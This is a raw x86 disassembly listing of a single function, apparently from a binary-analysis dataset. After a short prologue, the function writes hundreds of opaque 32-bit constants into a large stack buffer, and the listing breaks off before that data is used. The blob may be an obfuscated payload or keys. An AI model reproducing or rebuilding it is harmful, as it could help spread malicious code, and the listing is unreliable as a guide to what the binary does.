sub_401000
push ebp
mov ebp esp
mov eax 0x1008
call sub_411400
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1008 ] edi
mov [ ebp - 0x1004 ] 0x99b97a98
mov [ ebp - 0x1000 ] 0xa22409fe
mov [ ebp - 0xffc ] 0x2b410adf
mov [ ebp - 0xff8 ] 0x9360e214
mov [ ebp - 0xff4 ] 0xf9cd6f74
mov [ ebp - 0xff0 ] 0x5dc31ba
mov [ ebp - 0xfec ] 0xc3926853
mov [ ebp - 0xfe8 ] 0xd36a113b
mov [ ebp - 0xfe4 ] 0x896c238b
mov [ ebp - 0xfe0 ] 0xc2b902d
mov [ ebp - 0xfdc ] 0xae376d9a
mov [ ebp - 0xfd8 ] 0xc342984f
mov [ ebp - 0xfd4 ] 0xc1bd0f07
mov [ ebp - 0xfd0 ] 0x93c69940
mov [ ebp - 0xfcc ] 0x3c565801
mov [ ebp - 0xfc8 ] 0xf50fc06a
mov [ ebp - 0xfc4 ] 0x117f7be4
mov [ ebp - 0xfc0 ] 0xa61daa0c
mov [ ebp - 0xfbc ] 0x67555417
mov [ ebp - 0xfb8 ] 0xf32a97ec
mov [ ebp - 0xfb4 ] 0xe6b4e7a6
mov [ ebp - 0xfb0 ] 0x81797b80
mov [ ebp - 0xfac ] 0x3dbdcfd3
mov [ ebp - 0xfa8 ] 0x7333cc8f
mov [ ebp - 0xfa4 ] 0x5484b248
mov [ ebp - 0xfa0 ] 0x74faa15c
mov [ ebp - 0xf9c ] 0xe2db4ff6
mov [ ebp - 0xf98 ] 0x8cd605e6
mov [ ebp - 0xf94 ] 0x6d728aed
mov [ ebp - 0xf90 ] 0xd9efeb05
mov [ ebp - 0xf8c ] 0x4a16acba
mov [ ebp - 0xf88 ] 0xc1bd4979
mov [ ebp - 0xf84 ] 0x581542fb
mov [ ebp - 0xf80 ] 0xd9cc0fe3
mov [ ebp - 0xf7c ] 0x45bca75f
mov [ ebp - 0xf78 ] 0x99d292ac
mov [ ebp - 0xf74 ] 0x2207441c
mov [ ebp - 0xf70 ] 0xeafbf630
mov [ ebp - 0xf6c ] 0x1b3411a2
mov [ ebp - 0xf68 ] 0x56dcf25b
mov [ ebp - 0xf64 ] 0x17aef134
mov [ ebp - 0xf60 ] 0x60f17a01
mov [ ebp - 0xf5c ] 0xcea5ad21
mov [ ebp - 0xf58 ] 0x5b67773f
mov [ ebp - 0xf54 ] 0xec7d6ebc
mov [ ebp - 0xf50 ] 0x7d67864
mov [ ebp - 0xf4c ] 0xe5220b8a
mov [ ebp - 0xf48 ] 0x313bfffd
mov [ ebp - 0xf44 ] 0xf148eaf0
mov [ ebp - 0xf40 ] 0x86513964
mov [ ebp - 0xf3c ] 0x2554f7e6
mov [ ebp - 0xf38 ] 0x2a81bb6e
mov [ ebp - 0xf34 ] 0x8e16fe2a
mov [ ebp - 0xf30 ] 0x195ed77
mov [ ebp - 0xf2c ] 0xf5e6b8f8
mov [ ebp - 0xf28 ] 0xa72621b7
mov [ ebp - 0xf24 ] 0x70996e0b
mov [ ebp - 0xf20 ] 0x8ef6eaa8
mov [ ebp - 0xf1c ] 0x50b44ae1
mov [ ebp - 0xf18 ] 0x2f7a3505
mov [ ebp - 0xf14 ] 0xaabe9133
mov [ ebp - 0xf10 ] 0x76ab537e
mov [ ebp - 0xf0c ] 0xc26b910b
mov [ ebp - 0xf08 ] 0xbe6a91b3
mov [ ebp - 0xf04 ] 0xa72e03ff
mov [ ebp - 0xf00 ] 0xcf3624ed
mov [ ebp - 0xefc ] 0x741fea6e
mov [ ebp - 0xef8 ] 0x52a3991f
mov [ ebp - 0xef4 ] 0xa8fd612a
mov [ ebp - 0xef0 ] 0xc01ea8b5
mov [ ebp - 0xeec ] 0xed83893a
mov [ ebp - 0xee8 ] 0x1aabed1a
mov [ ebp - 0xee4 ] 0xddc1daf0
mov [ ebp - 0xee0 ] 0x6dacf7fe
mov [ ebp - 0xedc ] 0xe1cbe1
mov [ ebp - 0xed8 ] 0x8f538465
mov [ ebp - 0xed4 ] 0x9b3850e6
mov [ ebp - 0xed0 ] 0x325b56f8
mov [ ebp - 0xecc ] 0xfa1fdee0
mov [ ebp - 0xec8 ] 0xbb14cbcb
mov [ ebp - 0xec4 ] 0xa399d6a5
mov [ ebp - 0xec0 ] 0xaf1045cd
mov [ ebp - 0xebc ] 0x76aff111
mov [ ebp - 0xeb8 ] 0x5c050276
mov [ ebp - 0xeb4 ] 0x4bf73d52
mov [ ebp - 0xeb0 ] 0x747d5294
mov [ ebp - 0xeac ] 0xfc6e9d31
mov [ ebp - 0xea8 ] 0xdb88368
mov [ ebp - 0xea4 ] 0x26b05159
mov [ ebp - 0xea0 ] 0xa7d5c196
mov [ ebp - 0xe9c ] 0x281d85b2
mov [ ebp - 0xe98 ] 0xda842387
mov [ ebp - 0xe94 ] 0xf4257b60
mov [ ebp - 0xe90 ] 0xff68a2ce
mov [ ebp - 0xe8c ] 0xa7fbd73f
mov [ ebp - 0xe88 ] 0xb3b4b35a
mov [ ebp - 0xe84 ] 0x9bd96504
mov [ ebp - 0xe80 ] 0xd842af26
mov [ ebp - 0xe7c ] 0xbb016034
mov [ ebp - 0xe78 ] 0xe3958583
mov [ ebp - 0xe74 ] 0xcfd8ba01
mov [ ebp - 0xe70 ] 0x9cce405d
mov [ ebp - 0xe6c ] 0x7144c917
mov [ ebp - 0xe68 ] 0x8124f87d
mov [ ebp - 0xe64 ] 0x831cfe5d
mov [ ebp - 0xe60 ] 0xe15c5fad
mov [ ebp - 0xe5c ] 0x429c5dbf
mov [ ebp - 0xe58 ] 0xe32532e2
mov [ ebp - 0xe54 ] 0x49b2fdec
mov [ ebp - 0xe50 ] 0x55e6803e
mov [ ebp - 0xe4c ] 0xc7c72a4a
mov [ ebp - 0xe48 ] 0x8048eb22
mov [ ebp - 0xe44 ] 0x960365e9
mov [ ebp - 0xe40 ] 0x83775fc4
mov [ ebp - 0xe3c ] 0x9fc514bc
mov [ ebp - 0xe38 ] 0x3282ea46
mov [ ebp - 0xe34 ] 0x267c35e8
mov [ ebp - 0xe30 ] 0xff7b62b5
mov [ ebp - 0xe2c ] 0xaec6428c
mov [ ebp - 0xe28 ] 0x172e0f2e
mov [ ebp - 0xe24 ] 0x38ae3274
mov [ ebp - 0xe20 ] 0x4ebb2591
mov [ ebp - 0xe1c ] 0x7fed8039
mov [ ebp - 0xe18 ] 0x52b26f6a
mov [ ebp - 0xe14 ] 0x5a782ea4
mov [ ebp - 0xe10 ] 0x1c59f490
mov [ ebp - 0xe0c ] 0x64ca2036
mov [ ebp - 0xe08 ] 0xa37cf92f
mov [ ebp - 0xe04 ] 0xbcdb2a2b
mov [ ebp - 0xe00 ] 0x890a964f
mov [ ebp - 0xdfc ] 0x8008f716
mov [ ebp - 0xdf8 ] 0xbd3ba67
mov [ ebp - 0xdf4 ] 0x78654be8
mov [ ebp - 0xdf0 ] 0x7694bf3f
mov [ ebp - 0xdec ] 0xeda5fdf
mov [ ebp - 0xde8 ] 0x83b15658
mov [ ebp - 0xde4 ] 0xd03f8c80
mov [ ebp - 0xde0 ] 0x38594a22
mov [ ebp - 0xddc ] 0xa8b86141
mov [ ebp - 0xdd8 ] 0x4b48b1c
mov [ ebp - 0xdd4 ] 0x167d19d7
mov [ ebp - 0xdd0 ] 0xb78c11d8
mov [ ebp - 0xdcc ] 0xc8c56770
mov [ ebp - 0xdc8 ] 0x3e4b76bd
mov [ ebp - 0xdc4 ] 0x240e8b02
mov [ ebp - 0xdc0 ] 0x165c67d5
mov [ ebp - 0xdbc ] 0xe4bf15c8
mov [ ebp - 0xdb8 ] 0x77e973a0
mov [ ebp - 0xdb4 ] 0x658e668c
mov [ ebp - 0xdb0 ] 0xe81c1a77
mov [ ebp - 0xdac ] 0x3fb0e281
mov [ ebp - 0xda8 ] 0x5b7dfc58
mov [ ebp - 0xda4 ] 0x5c7f8b87
mov [ ebp - 0xda0 ] 0xba72dcf2
mov [ ebp - 0xd9c ] 0x919f31f1
mov [ ebp - 0xd98 ] 0x310988a4
mov [ ebp - 0xd94 ] 0x659697ee
mov [ ebp - 0xd90 ] 0x334db2b1
mov [ ebp - 0xd8c ] 0xed72fe94
mov [ ebp - 0xd88 ] 0x8148effa
mov [ ebp - 0xd84 ] 0x6cddc77a
mov [ ebp - 0xd80 ] 0x94264fa3
mov [ ebp - 0xd7c ] 0x2526c581
mov [ ebp - 0xd78 ] 0x3b562f4d
mov [ ebp - 0xd74 ] 0x77a1ecc6
mov [ ebp - 0xd70 ] 0x33aaee9f
mov [ ebp - 0xd6c ] 0xe6201cec
mov [ ebp - 0xd68 ] 0x8567680b
mov [ ebp - 0xd64 ] 0xd3f14430
mov [ ebp - 0xd60 ] 0x15681894
mov [ ebp - 0xd5c ] 0x2b3a8edd
mov [ ebp - 0xd58 ] 0x836691bd
mov [ ebp - 0xd54 ] 0x1cfa077d
mov [ ebp - 0xd50 ] 0xe250a5f6
mov [ ebp - 0xd4c ] 0xcdc970c1
mov [ ebp - 0xd48 ] 0x95230d9
mov [ ebp - 0xd44 ] 0x9dc4475
mov [ ebp - 0xd40 ] 0x391e445c
mov [ ebp - 0xd3c ] 0x8f6458d2
mov [ ebp - 0xd38 ] 0x6712cbe9
mov [ ebp - 0xd34 ] 0xc8830dd2
mov [ ebp - 0xd30 ] 0x73abd3b2
mov [ ebp - 0xd2c ] 0x1d407444
mov [ ebp - 0xd28 ] 0x192693a4
mov [ ebp - 0xd24 ] 0x332202d7
mov [ ebp - 0xd20 ] 0x196c4047
mov [ ebp - 0xd1c ] 0x82a9d199
mov [ ebp - 0xd18 ] 0x6ee9bb9c
mov [ ebp - 0xd14 ] 0x7a376dc8
mov [ ebp - 0xd10 ] 0x84eee240
mov [ ebp - 0xd0c ] 0xfaa12e56
mov [ ebp - 0xd08 ] 0x9814c7c1
mov [ ebp - 0xd04 ] 0x11cb36ca
mov [ ebp - 0xd00 ] 0x102a3877
mov [ ebp - 0xcfc ] 0xa592d309
mov [ ebp - 0xcf8 ] 0x57137c8f
mov [ ebp - 0xcf4 ] 0x29d24ae9
mov [ ebp - 0xcf0 ] 0x82aec02c
mov [ ebp - 0xcec ] 0xb07d4fee
mov [ ebp - 0xce8 ] 0xe1489117
mov [ ebp - 0xce4 ] 0x3ef214c7
mov [ ebp - 0xce0 ] 0x554e1c4c
mov [ ebp - 0xcdc ] 0x7ffae1f0
mov [ ebp - 0xcd8 ] 0x46d60d5d
mov [ ebp - 0xcd4 ] 0x846fa858
mov [ ebp - 0xcd0 ] 0x57071d68
mov [ ebp - 0xccc ] 0x8407846d
mov [ ebp - 0xcc8 ] 0xdc654f15
mov [ ebp - 0xcc4 ] 0xaf1b5763
mov [ ebp - 0xcc0 ] 0x63046973
mov [ ebp - 0xcbc ] 0xa7e2fe4a
mov [ ebp - 0xcb8 ] 0x64edb90c
mov [ ebp - 0xcb4 ] 0xcae85d61
mov [ ebp - 0xcb0 ] 0xe721ef7a
mov [ ebp - 0xcac ] 0x886b2873
mov [ ebp - 0xca8 ] 0xdb65d077
mov [ ebp - 0xca4 ] 0x9b8a8027
mov [ ebp - 0xca0 ] 0x34fe8fe9
mov [ ebp - 0xc9c ] 0x99dbe18d
mov [ ebp - 0xc98 ] 0xfbfdc99a
mov [ ebp - 0xc94 ] 0xa0c5e626
mov [ ebp - 0xc90 ] 0x4988e6d5
mov [ ebp - 0xc8c ] 0x86d1f30e
mov [ ebp - 0xc88 ] 0xeb6136c4
mov [ ebp - 0xc84 ] 0xa086ebb6
mov [ ebp - 0xc80 ] 0x8d4857a
mov [ ebp - 0xc7c ] 0xa1af66
mov [ ebp - 0xc78 ] 0x9efb9f78
mov [ ebp - 0xc74 ] 0x5a3fc185
mov [ ebp - 0xc70 ] 0xb6a3c7a7
mov [ ebp - 0xc6c ] 0x7e3c75ba
mov [ ebp - 0xc68 ] 0x626a9dab
mov [ ebp - 0xc64 ] 0x302f088
mov [ ebp - 0xc60 ] 0xdb0bd675
mov [ ebp - 0xc5c ] 0xfedbac85
mov [ ebp - 0xc58 ] 0xd09cd74b
mov [ ebp - 0xc54 ] 0x3f2bdb98
mov [ ebp - 0xc50 ] 0x5df5cea2
mov [ ebp - 0xc4c ] 0xefdb3143
mov [ ebp - 0xc48 ] 0x575145ce
mov [ ebp - 0xc44 ] 0xab5a5336
mov [ ebp - 0xc40 ] 0xae876529
mov [ ebp - 0xc3c ] 0x5dac6211
mov [ ebp - 0xc38 ] 0xd12d4939
mov [ ebp - 0xc34 ] 0xc7115824
mov [ ebp - 0xc30 ] 0x6a240627
mov [ ebp - 0xc2c ] 0x659ff38
mov [ ebp - 0xc28 ] 0x7b5daa45
mov [ ebp - 0xc24 ] 0x2626b7fd
mov [ ebp - 0xc20 ] 0x2ed5ad1c
mov [ ebp - 0xc1c ] 0x498b8110
mov [ ebp - 0xc18 ] 0xef1bb8ca
mov [ ebp - 0xc14 ] 0x38b62c11
mov [ ebp - 0xc10 ] 0x6aa2da32
mov [ ebp - 0xc0c ] 0x1e71fcd9
mov [ ebp - 0xc08 ] 0xa499cea6
mov [ ebp - 0xc04 ] 0xa2cac086
mov [ ebp - 0xc00 ] 0x7dd09f6d
mov [ ebp - 0xbfc ] 0xebc75b21
mov [ ebp - 0xbf8 ] 0x25dae214
mov [ ebp - 0xbf4 ] 0x405d900e
mov [ ebp - 0xbf0 ] 0x44abff6a
mov [ ebp - 0xbec ] 0xa2621cfb
mov [ ebp - 0xbe8 ] 0x7046fcea
mov [ ebp - 0xbe4 ] 0x291310bc
mov [ ebp - 0xbe0 ] 0xd1a7e3b0
mov [ ebp - 0xbdc ] 0x53bc6e3f
mov [ ebp - 0xbd8 ] 0x5e789750
mov [ ebp - 0xbd4 ] 0x929ed527
mov [ ebp - 0xbd0 ] 0xd0d649d4
mov [ ebp - 0xbcc ] 0x50723865
mov [ ebp - 0xbc8 ] 0xf0c0b834
mov [ ebp - 0xbc4 ] 0x781ad3c8
mov [ ebp - 0xbc0 ] 0xf649c1b7
mov [ ebp - 0xbbc ] 0x7f49062f
mov [ ebp - 0xbb8 ] 0xc4ddc19d
mov [ ebp - 0xbb4 ] 0x6a567b96
mov [ ebp - 0xbb0 ] 0x2a3a2cc5
mov [ ebp - 0xbac ] 0x997aac65
mov [ ebp - 0xba8 ] 0x2d8a3b64
mov [ ebp - 0xba4 ] 0xc5a5a40e
mov [ ebp - 0xba0 ] 0x94bbef65
mov [ ebp - 0xb9c ] 0x921304f5
mov [ ebp - 0xb98 ] 0x5b56f0c5
mov [ ebp - 0xb94 ] 0x30c6ad6b
mov [ ebp - 0xb90 ] 0x3e5b00d9
mov [ ebp - 0xb8c ] 0x11d8d5ad
mov [ ebp - 0xb88 ] 0x1f3e6210
mov [ ebp - 0xb84 ] 0x6be4e406
mov [ ebp - 0xb80 ] 0xc8ffa0d3
mov [ ebp - 0xb7c ] 0x6a5a12a4
mov [ ebp - 0xb78 ] 0x6dc5b002
mov [ ebp - 0xb74 ] 0x379e8b5d
mov [ ebp - 0xb70 ] 0x3975f98c
mov [ ebp - 0xb6c ] 0xdf4a4dce
mov [ ebp - 0xb68 ] 0xb5fe89af
mov [ ebp - 0xb64 ] 0x4020e26d
mov [ ebp - 0xb60 ] 0x27081f82
mov [ ebp - 0xb5c ] 0x33916231
mov [ ebp - 0xb58 ] 0x70a15612
mov [ ebp - 0xb54 ] 0x6ea73fe2
mov [ ebp - 0xb50 ] 0x6a71c38
mov [ ebp - 0xb4c ] 0x19e5f16a
mov [ ebp - 0xb48 ] 0xe7cfe37a
mov [ ebp - 0xb44 ] 0x4827efc6
mov [ ebp - 0xb40 ] 0x406f2f0f
mov [ ebp - 0xb3c ] 0xa4740091
mov [ ebp - 0xb38 ] 0x39141557
mov [ ebp - 0xb34 ] 0x8ca7bb54
mov [ ebp - 0xb30 ] 0x41924ed7
mov [ ebp - 0xb2c ] 0xba5b783f
mov [ ebp - 0xb28 ] 0x21a12a5b
mov [ ebp - 0xb24 ] 0x286ac919
mov [ ebp - 0xb20 ] 0x8a69d9f8
mov [ ebp - 0xb1c ] 0x312eddda
mov [ ebp - 0xb18 ] 0x466a42f2
mov [ ebp - 0xb14 ] 0xd4d211fd
mov [ ebp - 0xb10 ] 0x9e16645f
mov [ ebp - 0xb0c ] 0x385871dc
mov [ ebp - 0xb08 ] 0xb459fa9b
mov [ ebp - 0xb04 ] 0xbbddc3c3
mov [ ebp - 0xb00 ] 0x7745469d
mov [ ebp - 0xafc ] 0x15a87323
mov [ ebp - 0xaf8 ] 0xb25b12b5
mov [ ebp - 0xaf4 ] 0x82872d23
mov [ ebp - 0xaf0 ] 0x6e209d91
mov [ ebp - 0xaec ] 0xa9a6790e
mov [ ebp - 0xae8 ] 0x365dff73
mov [ ebp - 0xae4 ] 0x60f13ac3
mov [ ebp - 0xae0 ] 0xa3d73780
mov [ ebp - 0xadc ] 0x60b87faa
mov [ ebp - 0xad8 ] 0xb4121391
mov [ ebp - 0xad4 ] 0xd2369940
mov [ ebp - 0xad0 ] 0x44405636
mov [ ebp - 0xacc ] 0x42ede6cf
mov [ ebp - 0xac8 ] 0xa8784be5
mov [ ebp - 0xac4 ] 0x6086a85
mov [ ebp - 0xac0 ] 0x4ba9dfa1
mov [ ebp - 0xabc ] 0xefab625e
mov [ ebp - 0xab8 ] 0xb6a3be75
mov [ ebp - 0xab4 ] 0x8e88d957
mov [ ebp - 0xab0 ] 0xffd2c830
mov [ ebp - 0xaac ] 0x9342c0ae
mov [ ebp - 0xaa8 ] 0x903cba0b
mov [ ebp - 0xaa4 ] 0xc5964424
mov [ ebp - 0xaa0 ] 0x82114024
mov [ ebp - 0xa9c ] 0x1772bca2
mov [ ebp - 0xa98 ] 0xd2cd157a
mov [ ebp - 0xa94 ] 0x1f6055ef
mov [ ebp - 0xa90 ] 0xcb1e321d
mov [ ebp - 0xa8c ] 0xfd5f60f2
mov [ ebp - 0xa88 ] 0x3f8e9b1b
mov [ ebp - 0xa84 ] 0x30524df
mov [ ebp - 0xa80 ] 0x6861664
mov [ ebp - 0xa7c ] 0x4d1ef8d2
mov [ ebp - 0xa78 ] 0xfc1feb0d
mov [ ebp - 0xa74 ] 0x5e1b7f41
mov [ ebp - 0xa70 ] 0xa42a3ab1
mov [ ebp - 0xa6c ] 0xb5a1899a
mov [ ebp - 0xa68 ] 0x3f52f24
mov [ ebp - 0xa64 ] 0xb807fa54
mov [ ebp - 0xa60 ] 0xe2bf8d10
mov [ ebp - 0xa5c ] 0x922fdd85
mov [ ebp - 0xa58 ] 0x98f4ec8
mov [ ebp - 0xa54 ] 0x7f68aacd
mov [ ebp - 0xa50 ] 0x7f2392e4
mov [ ebp - 0xa4c ] 0x3f34c41b
mov [ ebp - 0xa48 ] 0x484229f4
mov [ ebp - 0xa44 ] 0x33004923
mov [ ebp - 0xa40 ] 0x5b16bfd6
mov [ ebp - 0xa3c ] 0x65ee459c
mov [ ebp - 0xa38 ] 0x616e7d94
mov [ ebp - 0xa34 ] 0xce0d627
mov [ ebp - 0xa30 ] 0x838b0368
mov [ ebp - 0xa2c ] 0xbcc2bfc8
mov [ ebp - 0xa28 ] 0xc0405e9
mov [ ebp - 0xa24 ] 0x2540044e
mov [ ebp - 0xa20 ] 0x608056c4
mov [ ebp - 0xa1c ] 0x2fc56e9b
mov [ ebp - 0xa18 ] 0x139134eb
mov [ ebp - 0xa14 ] 0x731f710a
mov [ ebp - 0xa10 ] 0x3df6aa75
mov [ ebp - 0xa0c ] 0x52f9b969
mov [ ebp - 0xa08 ] 0xc5ffdbe
mov [ ebp - 0xa04 ] 0xc5319f01
mov [ ebp - 0xa00 ] 0x9026b2f5
mov [ ebp - 0x9fc ] 0xcc0eb20
mov [ ebp - 0x9f8 ] 0x2a1f511f
mov [ ebp - 0x9f4 ] 0x379d3ec2
mov [ ebp - 0x9f0 ] 0x517493e8
mov [ ebp - 0x9ec ] 0xaa46d4c
mov [ ebp - 0x9e8 ] 0x6c17036a
mov [ ebp - 0x9e4 ] 0x973148a2
mov [ ebp - 0x9e0 ] 0x1b2757fa
mov [ ebp - 0x9dc ] 0x6227e743
mov [ ebp - 0x9d8 ] 0xfb8c4638
mov [ ebp - 0x9d4 ] 0x6c322984
mov [ ebp - 0x9d0 ] 0x9bda7bd
mov [ ebp - 0x9cc ] 0x7f146114
mov [ ebp - 0x9c8 ] 0x6eb2b64
mov [ ebp - 0x9c4 ] 0x6e9d1c73
mov [ ebp - 0x9c0 ] 0xb789c574
mov [ ebp - 0x9bc ] 0xe519b0ac
mov [ ebp - 0x9b8 ] 0x7ae0a6f6
mov [ ebp - 0x9b4 ] 0x8ce612cf
mov [ ebp - 0x9b0 ] 0xce96a3b9
mov [ ebp - 0x9ac ] 0x694daa05
mov [ ebp - 0x9a8 ] 0x487038d5
mov [ ebp - 0x9a4 ] 0xc8b60d54
mov [ ebp - 0x9a0 ] 0x7f7f3fd2
mov [ ebp - 0x99c ] 0xe56499ef
mov [ ebp - 0x998 ] 0xe5f443f
mov [ ebp - 0x994 ] 0x109b4556
mov [ ebp - 0x990 ] 0xeede31e9
mov [ ebp - 0x98c ] 0xb0572bdb
mov [ ebp - 0x988 ] 0xb7f8c763
mov [ ebp - 0x984 ] 0xa780afd5
mov [ ebp - 0x980 ] 0xde26ffee
mov [ ebp - 0x97c ] 0xd7c38a98
mov [ ebp - 0x978 ] 0x25e623ce
mov [ ebp - 0x974 ] 0x51358168
mov [ ebp - 0x970 ] 0x8d3f13b2
mov [ ebp - 0x96c ] 0xa13d973e
mov [ ebp - 0x968 ] 0x3358355e
mov [ ebp - 0x964 ] 0xd3dbd8e4
mov [ ebp - 0x960 ] 0x70b101d8
mov [ ebp - 0x95c ] 0x5a48748c
mov [ ebp - 0x958 ] 0x7f2e97
mov [ ebp - 0x954 ] 0x6151b4af
mov [ ebp - 0x950 ] 0x5ee91c7
mov [ ebp - 0x94c ] 0x86a62b28
mov [ ebp - 0x948 ] 0x45baff60
mov [ ebp - 0x944 ] 0xaf1895d7
mov [ ebp - 0x940 ] 0x2220c996
mov [ ebp - 0x93c ] 0xd57d683d
mov [ ebp - 0x938 ] 0x45d5fc96
mov [ ebp - 0x934 ] 0x78a626b1
mov [ ebp - 0x930 ] 0xdf7e94b7
mov [ ebp - 0x92c ] 0x1f6624bf
mov [ ebp - 0x928 ] 0xfb642023
mov [ ebp - 0x924 ] 0x4baa7cb5
mov [ ebp - 0x920 ] 0x836eca45
mov [ ebp - 0x91c ] 0xc858eb32
mov [ ebp - 0x918 ] 0x980d2de7
mov [ ebp - 0x914 ] 0xb11b353
mov [ ebp - 0x910 ] 0x6ea8f47
mov [ ebp - 0x90c ] 0xd72650b3
mov [ ebp - 0x908 ] 0x25d28a70
mov [ ebp - 0x904 ] 0x4c717c07
mov [ ebp - 0x900 ] 0x79cfdf47
mov [ ebp - 0x8fc ] 0xb14227ca
mov [ ebp - 0x8f8 ] 0xa84a4f54
mov [ ebp - 0x8f4 ] 0x4ab35b03
mov [ ebp - 0x8f0 ] 0x9d519dea
mov [ ebp - 0x8ec ] 0x5e7477ee
mov [ ebp - 0x8e8 ] 0x8844601
mov [ ebp - 0x8e4 ] 0xa55f5c3
mov [ ebp - 0x8e0 ] 0x9e8324d4
mov [ ebp - 0x8dc ] 0xa04fc54c
mov [ ebp - 0x8d8 ] 0x18489915
mov [ ebp - 0x8d4 ] 0xde62fbf4
mov [ ebp - 0x8d0 ] 0x877cb399
mov [ ebp - 0x8cc ] 0x2ce5f02a
mov [ ebp - 0x8c8 ] 0xfa346937
mov [ ebp - 0x8c4 ] 0x3204895e
mov [ ebp - 0x8c0 ] 0xfad087ae
mov [ ebp - 0x8bc ] 0x629a204d
mov [ ebp - 0x8b8 ] 0xae7ae3b9
mov [ ebp - 0x8b4 ] 0x778cdcde
mov [ ebp - 0x8b0 ] 0xbafe0890
mov [ ebp - 0x8ac ] 0x30e6e4f9
mov [ ebp - 0x8a8 ] 0xac2a1b4d
mov [ ebp - 0x8a4 ] 0x52de2ea4
mov [ ebp - 0x8a0 ] 0x24cafb5
mov [ ebp - 0x89c ] 0x8864e7cf
mov [ ebp - 0x898 ] 0xa836deca
mov [ ebp - 0x894 ] 0x4b20c3bb
mov [ ebp - 0x890 ] 0xc4051ecb
mov [ ebp - 0x88c ] 0x50f4ec02
mov [ ebp - 0x888 ] 0xabfc1e07
mov [ ebp - 0x884 ] 0x2feda4c
mov [ ebp - 0x880 ] 0x58044a89
mov [ ebp - 0x87c ] 0xfbe16931
mov [ ebp - 0x878 ] 0x2a41747
mov [ ebp - 0x874 ] 0xa64dc4da
mov [ ebp - 0x870 ] 0xe56a53e2
mov [ ebp - 0x86c ] 0x46355f3f
mov [ ebp - 0x868 ] 0xcaf1317d
mov [ ebp - 0x864 ] 0x95ccef0b
mov [ ebp - 0x860 ] 0x6bedd03a
mov [ ebp - 0x85c ] 0x8167ce39
mov [ ebp - 0x858 ] 0xc0830be6
mov [ ebp - 0x854 ] 0xb166d1cf
mov [ ebp - 0x850 ] 0x6396d124
mov [ ebp - 0x84c ] 0xada9cb30
mov [ ebp - 0x848 ] 0x8779afc
mov [ ebp - 0x844 ] 0xc49d438a
mov [ ebp - 0x840 ] 0x4d2f8a14
mov [ ebp - 0x83c ] 0x3fce9659
mov [ ebp - 0x838 ] 0x70ff52a1
mov [ ebp - 0x834 ] 0x47226623
mov [ ebp - 0x830 ] 0x67aab837
mov [ ebp - 0x82c ] 0x80145384
mov [ ebp - 0x828 ] 0x77888ced
mov [ ebp - 0x824 ] 0xe33b25cf
mov [ ebp - 0x820 ] 0x9316bb0
mov [ ebp - 0x81c ] 0xa348ff01
mov [ ebp - 0x818 ] 0x74134751
mov [ ebp - 0x814 ] 0xe4bb35ad
mov [ ebp - 0x810 ] 0x724b65ee
mov [ ebp - 0x80c ] 0xa6f260b8
mov [ ebp - 0x808 ] 0xbb1d7bec
mov [ ebp - 0x804 ] 0x509f59a0
mov [ ebp - 0x800 ] 0xc559d0c4
mov [ ebp - 0x7fc ] 0x2168a1cf
mov [ ebp - 0x7f8 ] 0x96957ce9
mov [ ebp - 0x7f4 ] 0x9f7b51b1
mov [ ebp - 0x7f0 ] 0x6f11c6b6
mov [ ebp - 0x7ec ] 0x12150426
mov [ ebp - 0x7e8 ] 0x1fce327f
mov [ ebp - 0x7e4 ] 0x4f706d8b
mov [ ebp - 0x7e0 ] 0xc15c93d
mov [ ebp - 0x7dc ] 0x542d7d6b
mov [ ebp - 0x7d8 ] 0xabeac3f9
mov [ ebp - 0x7d4 ] 0xca4a6514
mov [ ebp - 0x7d0 ] 0x52395c2c
mov [ ebp - 0x7cc ] 0xdf654e60
mov [ ebp - 0x7c8 ] 0xcfe3381
mov [ ebp - 0x7c4 ] 0xdd5c6ea0
mov [ ebp - 0x7c0 ] 0xa3e97138
mov [ ebp - 0x7bc ] 0xe8f717ee
mov [ ebp - 0x7b8 ] 0xee93e1da
mov [ ebp - 0x7b4 ] 0x73b8dd47
mov [ ebp - 0x7b0 ] 0x99c5f239
mov [ ebp - 0x7ac ] 0xc1782a40
mov [ ebp - 0x7a8 ] 0xfdce775d
mov [ ebp - 0x7a4 ] 0x1dda2ae5
mov [ ebp - 0x7a0 ] 0x89c0c49b
mov [ ebp - 0x79c ] 0xb571b7db
mov [ ebp - 0x798 ] 0xe0a30499
mov [ ebp - 0x794 ] 0x1b535be2
mov [ ebp - 0x790 ] 0x8eb5184d
mov [ ebp - 0x78c ] 0xa04f2d43
mov [ ebp - 0x788 ] 0x8a9e1da4
mov [ ebp - 0x784 ] 0xe2a77847
mov [ ebp - 0x780 ] 0x176c683c
mov [ ebp - 0x77c ] 0xb8ccdd1f
mov [ ebp - 0x778 ] 0xc4986fe2
mov [ ebp - 0x774 ] 0x18dfebcb
mov [ ebp - 0x770 ] 0x47a69404
mov [ ebp - 0x76c ] 0x66e7f6c2
mov [ ebp - 0x768 ] 0x5bf08513
mov [ ebp - 0x764 ] 0x3a3d98fe
mov [ ebp - 0x760 ] 0x1f52a900
mov [ ebp - 0x75c ] 0x69d81e87
mov [ ebp - 0x758 ] 0x592d708e
mov [ ebp - 0x754 ] 0x60710c5c
mov [ ebp - 0x750 ] 0x63a718a1
mov [ ebp - 0x74c ] 0x21c98e0e
mov [ ebp - 0x748 ] 0x127cba14
mov [ ebp - 0x744 ] 0x524cba52
mov [ ebp - 0x740 ] 0xea719e63
mov [ ebp - 0x73c ] 0x4b5349bd
mov [ ebp - 0x738 ] 0x16a480ba
mov [ ebp - 0x734 ] 0x2e76158d
mov [ ebp - 0x730 ] 0x3b911d2d
mov [ ebp - 0x72c ] 0xbf5d5aab
mov [ ebp - 0x728 ] 0x66d1d914
mov [ ebp - 0x724 ] 0xf7b81e93
mov [ ebp - 0x720 ] 0x79e12abc
mov [ ebp - 0x71c ] 0x2dc43573
mov [ ebp - 0x718 ] 0x424368b5
mov [ ebp - 0x714 ] 0xab70b97e
mov [ ebp - 0x710 ] 0x82e701d6
mov [ ebp - 0x70c ] 0x7041445c
mov [ ebp - 0x708 ] 0xb1d7131d
mov [ ebp - 0x704 ] 0xeda88f31
mov [ ebp - 0x700 ] 0x2d6789b9
mov [ ebp - 0x6fc ] 0x745a2bbe
mov [ ebp - 0x6f8 ] 0x12b69e94
mov [ ebp - 0x6f4 ] 0x2ebd2757
mov [ ebp - 0x6f0 ] 0x84b0a428
mov [ ebp - 0x6ec ] 0x6f5f1e8
mov [ ebp - 0x6e8 ] 0x35b7cc04
mov [ ebp - 0x6e4 ] 0x15235f5b
mov [ ebp - 0x6e0 ] 0xa7428ae8
mov [ ebp - 0x6dc ] 0x491b9cb5
